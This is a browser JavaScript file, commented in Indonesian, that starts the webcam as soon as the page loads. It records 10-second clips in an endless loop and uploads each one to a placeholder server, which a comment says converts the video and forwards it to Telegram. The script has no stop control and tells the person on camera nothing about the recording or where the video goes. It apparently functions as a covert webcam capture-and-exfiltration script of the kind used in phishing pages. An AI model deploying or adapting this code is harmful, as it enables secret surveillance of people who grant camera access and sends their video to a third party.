document.addEventListener("DOMContentLoaded", async function () {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("video").srcObject = stream;

        // Mulai rekaman video setiap 10 detik & kirim ke backend
        startRecordingLoop(stream);
    } catch (error) {
        console.error("Gagal mengakses kamera:", error);
    }
});

function startRecordingLoop(stream) {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
    let chunks = [];

    mediaRecorder.ondataavailable = (event) => {
        chunks.push(event.data);
    };

    mediaRecorder.onstop = async () => {
        const webmBlob = new Blob(chunks, { type: "video/webm" });

        // Kirim video ke backend untuk dikonversi ke MP4 & dikirim ke Telegram
        sendToBackend(webmBlob);

        // Mulai rekaman baru setelah 1 detik
        setTimeout(() => {
            chunks = [];
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 10000);
        }, 1000);
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 10000); // Rekam selama 10 detik
}

async function sendToBackend(videoBlob) {
    const formData = new FormData();
    formData.append("video", videoBlob, "stream.webm");

    try {
        await fetch("https://your-server.com/upload", { method: "POST", body: formData });
        console.log("Video dikirim ke backend");
    } catch (error) {
        console.error("Gagal mengirim video ke backend:", error);
    }
      }
